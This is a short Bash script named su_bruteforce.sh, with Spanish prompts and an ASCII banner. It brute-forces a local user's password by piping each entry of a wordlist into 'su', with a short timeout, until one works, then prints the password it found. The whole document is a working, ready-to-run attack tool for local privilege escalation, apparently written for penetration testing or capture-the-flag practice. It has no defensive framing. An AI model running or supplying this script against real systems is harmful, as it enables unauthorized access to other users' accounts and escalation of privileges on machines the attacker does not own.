#!/bin/bash

verde="\e[0;32m"
rojo="\e[0;31m"
morado="\e[1;35m"
azul="\e[0;34m"
cian="\e[0;36m"
reset="\e[0;39m"

usuario=$1
diccionario=$2
salida=""
n_intentos=0

function ctrl_c() {

echo -e "\n ${morado} [>] ${rojo}Finalizando script... \n ${reset}"
exit 1

}

trap ctrl_c SIGINT



function banner_ayuda() {

echo -e "${morado}            ____             _       _____                  "
echo -e "${morado}  ___ _   _| __ ) _ __ _   _| |_ ___|  ___|__  _ __ ___ ___ "
echo -e "${morado} / __| | | |  _ \| '__| | | | __/ _ \ |_ / _ \| '__/ __/ _ \\"
echo -e "${morado} \__ \ |_| | |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/"
echo -e "${morado} |___/\__,_|____/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|"
echo -e "${morado}                                                            \n${reset}"


echo -e "Uso: ${verde}./su_bruteforce.sh ${cian}[usuario] [diccionario] \n ${reset}"

exit 1
}



if ! [ $# -eq 2 ];then

banner_ayuda

fi


if ! command id $usuario &>/dev/null;then

echo -e "\n ${morado}[>] ${rojo}El usuario indicado no existe en el sistema\n${reset}"
exit 1
fi


if ! [ -f "$diccionario" ];then

echo -e "\n ${morado}[>] ${rojo}El diccionario no existe en la ruta indicada\n${reset}"
exit 1

fi


while IFS= read -r password; do

let "n_intentos++"

echo -ne "${morado}[>] ${azul}Probando contraseña: ${verde}$password ${reset}"
echo -ne "${morado}[>] ${azul}Numero de intentos de contraseña: ${verde}$n_intentos\r ${reset}"

if timeout 0.1 bash -c "echo '$password' | su '$usuario' -c 'echo Hello'" >/dev/null 2>&1;then
clear
echo -ne "\n ${azul}Contraseña encontrada: ${verde}$password ${reset}"
echo
break
fi
done < "$diccionario"
